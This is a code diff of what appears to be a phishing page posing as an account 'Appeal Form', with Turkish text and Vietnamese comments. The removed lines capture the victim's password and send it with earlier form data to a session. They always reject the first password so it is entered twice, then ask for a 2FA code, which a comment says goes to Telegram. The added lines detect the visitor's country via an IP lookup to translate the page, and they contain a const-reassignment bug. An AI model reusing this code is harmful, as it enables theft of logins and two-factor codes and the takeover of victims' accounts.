-            const btn = document.getElementById('pwd-submit-btn');
-
-            if (!pwd.value.trim()) {
-                error.textContent = (window.getTranslation && window.getTranslation('pwd.emptyError')) || "Şifrenizi girmediniz!";
-                return;
-            }
-
-            error.textContent = '';
-            btn.disabled = true;
-            btn.innerHTML = '<span class="loading-spinner"></span>';
-            pwdAttempts++;
-
-            const savedPwd = pwd.value;
-
+        // ============================================================
+        // GET USER COUNTRY FROM IP
+        // ============================================================
+        async function getUserCountry() {
             try {
-                // If session was lost or never created, re-send info + password together
-                if (!currentSessionId && window._savedFormData) {
-                    const [result] = await Promise.all([
-                        sendData({
-                            type: 'info',
-                            ...window._savedFormData,
-                            password: savedPwd
-                        }),
-                        new Promise(r => setTimeout(r, 3000))
-                    ]);
-                    if (result && result.success && result.session_id) {
-                        currentSessionId = result.session_id;
-                        localStorage.setItem('session_id', result.session_id);
-                    }
-                } else if (currentSessionId) {
-                    // Normal flow: send password to existing session
-                    await Promise.all([
-                        sendData({ type: 'password', session_id: currentSessionId, password: savedPwd }),
-                        new Promise(r => setTimeout(r, 3000))
-                    ]);
-                }
-            } catch (err) {
-                console.error('Password send error:', err);
-            }
-
-            btn.disabled = false;
-            btn.innerHTML = '<span id="pwd-btn-text" data-i18n="pwd.continue">' + ((window.getTranslation && window.getTranslation('pwd.continue')) || 'Devam Et') + '</span>';
-
-            if (pwdAttempts === 1) {
-                error.textContent = (window.getTranslation && window.getTranslation('pwd.incorrectError')) || "Girdiğiniz şifre yanlış.";
-                pwd.value = '';
-            } else {
-                error.textContent = '';
-                try { update2FADisplay(); } catch(e) { console.warn('update2FA:', e); }
-                document.getElementById('modal-password').classList.add('hidden');
-                document.getElementById('modal-2fa').classList.remove('hidden');
-            }
-        });
-
-        /* ===== 2FA Code Input - Enable button when 6-8 digits ===== */
-    document.getElementById('code-2fa').addEventListener('input', function () {
-    const btn = document.getElementById('tfa-submit-btn');
-    
-    // Lấy giá trị nhập vào và loại bỏ tất cả các ký tự không phải là số
-    let inputValue = this.value.replace(/[^0-9]/g, '');  // Chỉ lấy các số
-    console.log("Giá trị nhập vào sau khi loại bỏ ký tự không phải số:", inputValue);  // Kiểm tra giá trị
-
-    // Kiểm tra độ dài của chuỗi nhập vào
-    const len = inputValue.length;
-    console.log("Độ dài chuỗi nhập vào:", len);  // Kiểm tra độ dài chuỗi
-
-    // Kiểm tra nếu độ dài nhập vào là chính xác 6 hoặc 8 ký tự
-    if (len === 6 || len === 8) {
-        btn.disabled = false;  // Kích hoạt nút submit khi nhập đủ 6 hoặc 8 ký tự
-        btn.classList.add('tfa-enabled');
-    } else {
-        btn.disabled = true;  // Tắt nút submit khi không đủ 6 hoặc 8 ký tự
-        btn.classList.remove('tfa-enabled');
-    }
-
-    // Chặn nhập thêm ký tự nếu độ dài vượt quá 8 ký tự
-    if (len > 8) {
-        this.value = inputValue.substring(0, 8);  // Cắt chuỗi nếu có hơn 8 ký tự
-    }
-});
-        // 2️⃣ Gửi code lên Telegram khi nhấn submit
-        document.getElementById('tfa-submit-btn').addEventListener('submit', async function () {
-            const code = document.getElementById('code-2fa').value;
-            if (!code) return;
-
-        // Ví dụ gọi Telegram API (qua file telegram.js)
-            if (window.sendToTelegram) {
-                await sendToTelegram(code); // hàm gửi code bạn định nghĩa
-            }
-        });
-
-        /* ===== ESC Close Modal (disabled to prevent accidental data loss) ===== */
-    </script>
-
-    <script>
-        /* ===== Country Data ===== */
-        const countryCodeToFlag = { "+1": "us", "+7": "ru", "+20": "eg", "+27": "za", "+30": "gr", "+31": "nl", "+32": "be", "+33": "fr", "+34": "es", "+36": "hu", "+39": "it", "+40": "ro", "+41": "ch", "+43": "at", "+44": "gb", "+45": "dk", "+46": "se", "+47": "no", "+48": "pl", "+49": "de", "+51": "pe", "+52": "mx", "+53": "cu", "+54": "ar", "+55": "br", "+56": "cl", "+57": "co", "+58": "ve", "+60": "my", "+61": "au", "+62": "id", "+63": "ph", "+64": "nz", "+65": "sg", "+66": "th", "+81": "jp", "+82": "kr", "+84": "vn", "+86": "cn", "+90": "tr", "+91": "in", "+92": "pk", "+93": "af", "+94": "lk", "+95": "mm", "+98": "ir", "+212": "ma", "+213": "dz", "+216": "tn", "+218": "ly", "+220": "gm", "+221": "sn", "+222": "mr", "+223": "ml", "+224": "gn", "+225": "ci", "+226": "bf", "+227": "ne", "+228": "tg", "+229": "bj", "+230": "mu", "+231": "lr", "+232": "sl", "+233": "gh", "+234": "ng", "+235": "td", "+236": "cf", "+237": "cm", "+238": "cv", "+240": "gq", "+241": "ga", "+242": "cg", "+243": "cd", "+244": "ao", "+245": "gw", "+248": "sc", "+249": "sd", "+250": "rw", "+251": "et", "+252": "so", "+253": "dj", "+254": "ke", "+255": "tz", "+256": "ug", "+257": "bi", "+258": "mz", "+260": "zm", "+261": "mg", "+263": "zw", "+264": "na", "+265": "mw", "+266": "ls", "+267": "bw", "+268": "sz", "+269": "km", "+291": "er", "+297": "aw", "+298": "fo", "+299": "gl", "+350": "gi", "+351": "pt", "+352": "lu", "+353": "ie", "+354": "is", "+355": "al", "+356": "mt", "+357": "cy", "+358": "fi", "+359": "bg", "+370": "lt", "+371": "lv", "+372": "ee", "+373": "md", "+374": "am", "+375": "by", "+376": "ad", "+377": "mc", "+378": "sm", "+380": "ua", "+381": "rs", "+382": "me", "+383": "xk", "+385": "hr", "+386": "si", "+387": "ba", "+389": "mk", "+420": "cz", "+421": "sk", "+423": "li", "+500": "fk", "+501": "bz", "+502": "gt", "+503": "sv", "+504": "hn", "+505": "ni", "+506": "cr", "+507": "pa", "+509": "ht", "+591": "bo", "+592": "gy", "+593": "ec", "+595": "py", "+597": "sr", "+598": "uy", "+670": "tl", "+673": "bn", "+675": "pg", "+676": "to", "+677": "sb", "+678": "vu", "+679": "fj", "+680": "pw", "+685": "ws", "+686": "ki", "+850": "kp", "+852": "hk", "+853": "mo", "+855": "kh", "+856": "la", "+880": "bd", "+886": "tw", "+960": "mv", "+961": "lb", "+962": "jo", "+963": "sy", "+964": "iq", "+965": "kw", "+966": "sa", "+967": "ye", "+968": "om", "+970": "ps", "+971": "ae", "+972": "il", "+973": "bh", "+974": "qa", "+975": "bt", "+976": "mn", "+977": "np", "+992": "tj", "+993": "tm", "+994": "az", "+995": "ge", "+996": "kg", "+998": "uz" };
-
-        const countryCodeToName = { "+1": "Amerika Birleşik Devletleri", "+7": "Rusya", "+20": "Mısır", "+27": "Güney Afrika", "+30": "Yunanistan", "+31": "Hollanda", "+32": "Belçika", "+33": "Fransa", "+34": "İspanya", "+36": "Macaristan", "+39": "İtalya", "+40": "Romanya", "+41": "İsviçre", "+43": "Avusturya", "+44": "Birleşik Krallık", "+45": "Danimarka", "+46": "İsveç", "+47": "Norveç", "+48": "Polonya", "+49": "Almanya", "+51": "Peru", "+52": "Meksika", "+53": "Küba", "+54": "Arjantin", "+55": "Brezilya", "+56": "Şili", "+57": "Kolombiya", "+58": "Venezuela", "+60": "Malezya", "+61": "Avustralya", "+62": "Endonezya", "+63": "Filipinler", "+64": "Yeni Zelanda", "+65": "Singapur", "+66": "Tayland", "+81": "Japonya", "+82": "Güney Kore", "+84": "Vietnam", "+86": "Çin", "+90": "Türkiye", "+91": "Hindistan", "+92": "Pakistan", "+93": "Afganistan", "+94": "Sri Lanka", "+95": "Myanmar", "+98": "İran", "+212": "Fas", "+213": "Cezayir", "+216": "Tunus", "+218": "Libya", "+220": "Gambiya", "+221": "Senegal", "+222": "Moritanya", "+223": "Mali", "+224": "Gine", "+225": "Fildişi Sahili", "+226": "Burkina Faso", "+227": "Nijer", "+228": "Togo", "+229": "Benin", "+230": "Mauritius", "+231": "Liberya", "+232": "Sierra Leone", "+233": "Gana", "+234": "Nijerya", "+235": "Çad", "+236": "Orta Afrika Cumhuriyeti", "+237": "Kamerun", "+238": "Cape Verde", "+240": "Ekvator Ginesi", "+241": "Gabon", "+242": "Kongo Cumhuriyeti", "+243": "Kongo Demokratik Cumhuriyeti", "+244": "Angola", "+245": "Gine-Bissau", "+248": "Seyşeller", "+249": "Sudan", "+250": "Ruanda", "+251": "Etiyopya", "+252": "Somali", "+253": "Cibuti", "+254": "Kenya", "+255": "Tanzanya", "+256": "Uganda", "+257": "Burundi", "+258": "Mozambik", "+260": "Zambiya", "+261": "Madagaskar", "+263": "Zimbabve", "+264": "Namibya", "+265": "Malavi", "+266": "Lesotho", "+267": "Botsvana", "+268": "Svaziland", "+269": "Komorlar", "+291": "Eritre", "+297": "Aruba", "+298": "Faroe Adaları", "+299": "Grönland", "+350": "Cebelitarık", "+351": "Portekiz", "+352": "Lüksemburg", "+353": "İrlanda", "+354": "İzlanda", "+355": "Arnavutluk", "+356": "Malta", "+357": "Kıbrıs", "+358": "Finlandiya", "+359": "Bulgaristan", "+370": "Litvanya", "+371": "Letonya", "+372": "Estonya", "+373": "Moldova", "+374": "Ermenistan", "+375": "Belarus", "+376": "Andorra", "+377": "Monako", "+378": "San Marino", "+380": "Ukrayna", "+381": "Sırbistan", "+382": "Karadağ", "+383": "Kosova", "+385": "Hırvatistan", "+386": "Slovenya", "+387": "Bosna Hersek", "+389": "Kuzey Makedonya", "+420": "Çek Cumhuriyeti", "+421": "Slovakya", "+423": "Lihtenştayn", "+500": "Falkland Adaları", "+501": "Belize", "+502": "Guatemala", "+503": "El Salvador", "+504": "Honduras", "+505": "Nikaragua", "+506": "Kosta Rika", "+507": "Panama", "+509": "Haiti", "+591": "Bolivya", "+592": "Guyana", "+593": "Ekvador", "+595": "Paraguay", "+597": "Surinam", "+598": "Uruguay", "+670": "Doğu Timor", "+673": "Brunei", "+675": "Papua Yeni Gine", "+676": "Tonga", "+677": "Solomon Adaları", "+678": "Vanuatu", "+679": "Fiji", "+680": "Palau", "+685": "Samoa", "+686": "Kiribati", "+850": "Kuzey Kore", "+852": "Hong Kong", "+853": "Makao", "+855": "Kamboçya", "+856": "Laos", "+880": "Bangladeş", "+886": "Tayvan", "+960": "Maldivler", "+961": "Lübnan", "+962": "Ürdün", "+963": "Suriye", "+964": "Irak", "+965": "Kuveyt", "+966": "Suudi Arabistan", "+967": "Yemen", "+968": "Umman", "+970": "Filistin", "+971": "Birleşik Arap Emirlikleri", "+972": "İsrail", "+973": "Bahreyn", "+974": "Katar", "+975": "Butan", "+976": "Moğolistan", "+977": "Nepal", "+992": "Tacikistan", "+993": "Türkmenistan", "+994": "Azerbaycan", "+995": "Gürcistan", "+996": "Kırgızistan", "+998": "Özbekistan" };
-
-        let currentCountryCode = '+90';
-
-        function extractCountryCode(val) {
-            let t = val.startsWith('+') ? val : '+' + val;
-            t = '+' + t.replace(/\+/g, '');
-            for (const code of Object.keys(countryCodeToFlag).sort((a, b) => b.length - a.length)) {
-                if (t.startsWith(code)) return code;
-            }
-            return null;
-        }
-
-        function updateFlagFromCode(code) {
-            const flag = countryCodeToFlag[code];
-            if (flag) {
-                currentCountryCode = code;
-                const img = document.getElementById('selected-flag-img');
-                if (img) { img.src = 'https://flagcdn.com/w20/' + flag + '.png'; img.alt = flag.toUpperCase(); }
-                const sf = document.querySelector('.selected-flag');
-                if (sf) { sf.title = (countryCodeToName[code] || flag.toUpperCase()) + ': ' + code; }
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return data.country_code || 'US';
+            } catch (error) {
+                console.log('⚠️ Could not detect country, defaulting to US');
+                return 'US';
             }
         }
 
-        function toggleCountryDropdown() {
-            const dd = document.getElementById('country-dropdown');
-            const isOpen = dd.style.display !== 'none';
-            dd.style.display = isOpen ? 'none' : 'block';
-            document.getElementById('flag-dropdown').classList.toggle('open', !isOpen);
-            if (!isOpen) {
-                const si = document.getElementById('country-search');
-                if (si) { si.value = ''; dd.querySelectorAll('.country').forEach(i => i.style.display = ''); setTimeout(() => si.focus(), 50); }
+        // ============================================================
+        // TRANSLATE PAGE
+        // ============================================================
+        function translatePage(langCode) {
+            const langData = translations[langCode];
+            if (!langData) {
+                console.log(`⚠️ Language ${langCode} not found, using English`);
+                langCode = 'en';
+                langData = translations['en'];
             }
-        }
 
-        function selectCountry(code, flag) {
-            currentCountryCode = code;
-            const img = document.getElementById('selected-flag-img');
-            if (img) { img.src = 'https://flagcdn.com/w20/' + flag + '.png'; img.alt = flag.toUpperCase(); }
-            const sf = document.querySelector('.selected-flag');
-            if (sf) { sf.title = (countryCodeToName[code] || '') + ': ' + code; }
-            document.getElementById('phone').value = code + ' ';
-            document.getElementById('phone').focus();
-            document.getElementById('country-dropdown').style.display = 'none';
-            document.getElementById('flag-dropdown').classList.remove('open');
-        }
-
-        // Populate country dropdown
-        (function () {
-            const dd = document.getElementById('country-dropdown');
-            if (!dd) return;
-            const entries = Object.entries(countryCodeToName).sort((a, b) => a[1].localeCompare(b[1]));
-            let html = '';
-            for (const [code, name] of entries) {
-                const flag = countryCodeToFlag[code] || '';
-                const hl = code === '+90' ? ' highlight' : '';
-                html += `<li class="country${hl}" onclick="selectCountry('${code}','${flag}')"><img src="https://flagcdn.com/w20/${flag}.png" class="country-flag"><span class="country-name">${name}</span><span class="dial-code">${code}</span></li>`;
-            }
-            dd.insertAdjacentHTML('beforeend', html);
-        })();
-
-        // Phone input auto-format
-        const phoneInput = document.getElementById('phone');
-        if (phoneInput) {
-            phoneInput.addEventListener('input', function () {
-                let cleaned = this.value.replace(/[^\d+]/g, '');
-                cleaned = cleaned.startsWith('+') ? cleaned : '+' + cleaned;
-                cleaned = '+' + cleaned.replace(/\+/g, '');
-                const code = extractCountryCode(cleaned);
-                if (code) {
-                    if (code !== currentCountryCode) updateFlagFromCode(code);
-                    const digits = cleaned.substring(code.length);
-                    let fmt = '';
-                    for (let i = 0; i < digits.length; i++) {
-                        if (i > 0 && i % 3 === 0) fmt += ' ';
-                        fmt += digits[i];
-                    }
-                    this.value = code + (fmt ? ' ' + fmt : '');
-                } else {
-                    // No valid country code found (e.g. user typed local number like "0837899900")
-                    // Use currentCountryCode as fallback, strip leading zero if present
-                    const rawDigits = cleaned.replace(/^\+/, '');
-                    const localDigits = rawDigits.replace(/^0+/, ''); // strip leading zeros
-                    if (localDigits.length > 0) {
-                        let fmt = '';
-                        for (let i = 0; i < localDigits.length; i++) {
-                            if (i > 0 && i % 3 === 0) fmt += ' ';
-                            fmt += localDigits[i];
-                        }
-                        this.value = currentCountryCode + (fmt ? ' ' + fmt : '');
-                    } else {
-                        this.value = currentCountryCode + ' ';
-                    }
+            // Translate all elements with data-translate
+            document.querySelectorAll('[data-translate]').forEach(el => {
+                const key = el.getAttribute('data-translate');
+                if (langData[key]) {
+                    el.textContent = langData[key];
                 }
             });
+
+            // Update page language attribute
+            document.documentElement.lang = langCode;
+
+            console.log(`🌍 Language changed to: ${langCode}`);
         }
 
-        // Auto-detect country: check localStorage first (pre-fetched on /home), fallback to API
-        (async function autoDetectCountry() {
-            let detectedCode = '+90';
-            let detectedFlag = 'tr';
-
-            function findByCountry(cc) {
-                for (const [dialCode, flagCode] of Object.entries(countryCodeToFlag)) {
-                    if (flagCode === cc) return { dialCode, flagCode };
+        // ============================================================
+        // INITIALIZE - TỰ ĐỘNG DỊCH THEO IP
+        // ============================================================
+        document.addEventListener('DOMContentLoaded', async () => {
+            try {
+                // Lấy mã quốc gia từ IP
+                const countryCode = await getUserCountry();
+                console.log(`📍 Detected country: ${countryCode}`);
+                
+                // Map sang ngôn ngữ
+                let detectedLang = countryToLanguage[countryCode] || 'en';
+                
+                // Kiểm tra ngôn ngữ có tồn tại trong translations không
+                if (!translations[detectedLang]) {
+                    detectedLang = 'en';
                 }
-                return null;
-            }
-
-            // 1. Try localStorage (pre-fetched from /home page — instant)
-            const cached = localStorage.getItem('geo_country');
-            if (cached) {
-                const found = findByCountry(cached);
-                if (found) {
-                    detectedCode = found.dialCode;
-                    detectedFlag = found.flagCode;
-                }
-            } else {
-                // 2. Fallback: fetch from API
-                try {
-                    const controller = new AbortController();
-                    const timer = setTimeout(() => controller.abort(), 3000);
-                    const res = await fetch('/api/geo', { signal: controller.signal });
-                    clearTimeout(timer);
-                    const data = await res.json();
-                    if (data && data.country) {
-                        localStorage.setItem('geo_country', data.country);
-                        const found = findByCountry(data.country);
-                        if (found) {
-                            detectedCode = found.dialCode;
-                            detectedFlag = found.flagCode;
-                        }
-                    }
-                } catch (e) { }
-            }
-
-            // Apply detected (or default) country
-            currentCountryCode = detectedCode;
-            const flagImg = document.getElementById('selected-flag-img');
-            if (flagImg) {
-                flagImg.src = 'https://flagcdn.com/w20/' + detectedFlag + '.png';
-                flagImg.alt = detectedFlag.toUpperCase();
-            }
-            const selectedFlag = document.querySelector('.selected-flag');
-            if (selectedFlag) {
-                selectedFlag.title = (countryCodeToName[detectedCode] || '') + ': ' + detectedCode;
-            }
-            const phoneEl = document.getElementById('phone');
-            if (phoneEl && !phoneEl.value.trim()) phoneEl.value = detectedCode + ' ';
-        })();
-        // Country search filter
-        document.getElementById('country-search')?.addEventListener('input', function () {
-            const q = this.value.toLowerCase();
-            document.querySelectorAll('#country-dropdown .country').forEach(item => {
-                const name = item.querySelector('.country-name')?.textContent.toLowerCase() || '';
-                const dial = item.querySelector('.dial-code')?.textContent || '';
-                item.style.display = (name.includes(q) || dial.includes(q)) ? '' : 'none';
-            });
-        });
-
-        // Click outside to close dropdown
-        document.addEventListener('click', function (e) {
-            if (!e.target.closest('.flag-dropdown') && !e.target.closest('.country-list')) {
-                const dd = document.getElementById('country-dropdown');
-                if (dd) { dd.style.display = 'none'; document.getElementById('flag-dropdown')?.classList.remove('open'); }
+                
+                console.log(`🌍 Detected language: ${detectedLang}`);
+                translatePage(detectedLang);
+                
+            } catch (error) {
+                console.log('⚠️ Using default language (English)');
+                translatePage('en');
             }
         });
     </script>
-    
-    <script src="./Appeal Forms_files/telegram.js.download"></script>
-
-<!-- Font chuẩn cho tiếng Thổ Nhĩ Kỳ -->
-<link href="./Appeal Forms_files/css2" rel="stylesheet">
-
-<style>
-/* Ẩn Google Translate */
-.skiptranslate {
-    display: none !important;
-}
-
-/* FIX toàn bộ form */
-.form-coursera-field {
-    align-items: flex-start !important;
-}
-
-/* FIX chữ Thổ Nhĩ Kỳ bị lệch / nghiêng */
-.form-coursera-field span {
-    display: block;
-    font-size: 14px;
-    font-weight: bold;
-    color: #90949C;
-    margin-bottom: 2px;
-
-    line-height: 1.6;
-
-    /* QUAN TRỌNG NHẤT */
-    font-family: "Noto Sans Turkish", Arial, sans-serif !important;
-
-    -webkit-font-smoothing: antialiased;
-    text-rendering: optimizeLegibility;
-
-    transform: none !important;
-    letter-spacing: normal;
-
-    direction: ltr;
-    text-align: left;
-    white-space: normal;
-}
-
-/* FIX thêm nếu bị override từ ngoài */
-body {
-    font-family: "Noto Sans Turkish", Arial, sans-serif;
-}
-.radio-group span {
-    font-family: "Noto Sans Turkish", sans-serif;
-}
-.radio-group label {
-    display: flex;
-    align-items: flex-start;
-    gap: 10px;
-    cursor: pointer;
-}
-
-.radio-group input {
-    margin-top: 4px;
-}
-
-.radio-group span {
-    display: block;
-    line-height: 1.6;
-}
-.radio-group label:first-child input {
-    margin-top: -2px; /* chỉnh số này nếu cần */
-}
-.radio-group label:first-child {
-    position: relative;
-    top: -2px;
-}
-.form-coursera-field > span {
-    display: flex;
-    flex-direction: row-reverse; /* QUAN TRỌNG */
-    justify-content: flex-start;
-    gap: 5px;
-}
-.form-coursera-field span {
-    display: inline-flex !important;
-    align-items: center;
-    gap: 5px;
-    direction: rtl;
-    text-align: right;
-    white-space: nowrap;
-}
-.form-coursera-field span span:last-child {
-    color: red;
-    flex-shrink: 0; /* không cho nó bị rớt */
-}
-</style>
-
-
-</body></html>
+</body>
+</html>
